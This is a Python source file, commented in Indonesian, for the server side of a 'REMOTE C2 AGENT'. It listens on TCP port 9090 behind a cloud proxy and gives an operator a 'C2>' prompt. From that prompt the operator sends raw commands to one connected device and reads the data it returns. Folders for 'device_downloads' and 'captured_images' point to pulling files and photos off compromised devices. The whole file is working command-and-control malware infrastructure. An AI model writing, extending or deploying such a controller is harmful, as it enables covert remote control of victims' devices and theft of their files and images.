import socket
import json
import threading
import base64
from datetime import datetime
import time
import logging
import sys
import os
from colorama import init, Fore, Style
import signal

# --- Globals ---
client_socket = None
client_address = None
running = True
# Kita tidak lagi butuh state web seperti in_shell_mode, dll di level global
# karena tidak ada web interface

# --- Setup ---
init(autoreset=True)
if not os.path.exists('device_downloads'): os.makedirs('device_downloads')
if not os.path.exists('captured_images'): os.makedirs('captured_images')

def print_header():
    print(Fore.CYAN + "=" * 80)
    print(Fore.CYAN + "      REMOTE C2 AGENT - PURE TCP PROXY ARCHITECTURE")
    print(Fore.CYAN + "=" * 80)

def handle_incoming_data(data):
    """Fungsi sederhana untuk mencetak semua data yang masuk dari perangkat."""
    try:
        # Hanya print data mentah ke terminal agar kita tahu koneksi berhasil
        print(f"\n{Fore.GREEN}[RECV]: {data[:300]}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Could not process data: {e}")

# --- Handler Koneksi TCP ---
def handle_connection(conn, addr):
    global client_socket, client_address
    buffer = ""
    try:
        client_socket, client_address = conn, addr
        print(f"\n{Fore.GREEN}[+] Accepted TCP connection from {addr[0]}:{addr[1]}")

        while running:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data: break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip():
                    handle_incoming_data(line.strip())
    except (ConnectionResetError, BrokenPipeError, socket.timeout):
        print(f"\n{Fore.RED}Client connection lost.")
    finally:
        print(f"\n{Fore.RED}TCP client disconnected.")
        client_socket = None
        client_address = None
        conn.close()

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((host, port))
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Could not bind to port {port}: {e}")
        os._exit(1)

    server_socket.listen(1)
    # Port internal adalah 9090, tapi akan diekspos oleh Railway via TCP Proxy
    print(f"[*] Pure TCP server listening on {host}:{port}")

    while running:
        try:
            conn, addr = server_socket.accept()
            if client_socket is not None:
                print(f"\n{Fore.YELLOW}[-] Rejecting new connection. A client is already connected.")
                conn.close()
                continue
            
            thread = threading.Thread(target=handle_connection, args=(conn, addr), daemon=True)
            thread.start()
        except OSError:
            break
        except Exception as e:
            if running: print(f"{Fore.RED}[ERROR] Server on port {port} crashed: {e}")
            break
    server_socket.close()

# --- Shell untuk mengirim perintah ---
def command_shell():
    global running
    time.sleep(2) # Beri waktu server untuk start
    while running:
        try:
            cmd_input = input(f"{Fore.CYAN}C2> {Style.RESET_ALL}")
            if not cmd_input: continue
            if cmd_input.lower() in ['quit', 'exit']:
                running = False
                break
            
            if client_socket:
                try:
                    # Kirim perintah mentah, biarkan klien yang memproses
                    client_socket.sendall(f"{cmd_input}\n".encode('utf-8'))
                except (BrokenPipeError, ConnectionResetError):
                    print(Fore.RED + "Failed to send: Client disconnected.")
                    client_socket = None
            else:
                print(Fore.YELLOW + "No client connected.")
        except (EOFError, KeyboardInterrupt):
            running = False
            break
            
if __name__ == '__main__':
    def signal_handler(sig, frame):
        global running
        running = False
        print("\nExiting...")
        if client_socket:
            client_socket.close()
        # Force exit
        threading.Timer(1.5, os._exit, [0]).start()

    signal.signal(signal.SIGINT, signal_handler)
    print_header()

    # Jalankan server TCP di port 9090
    server_thread = threading.Thread(target=start_server, args=('0.0.0.0', 9090), daemon=True)
    server_thread.start()

    # Jalankan shell perintah di thread utama
    command_shell()
    os._exit(0)
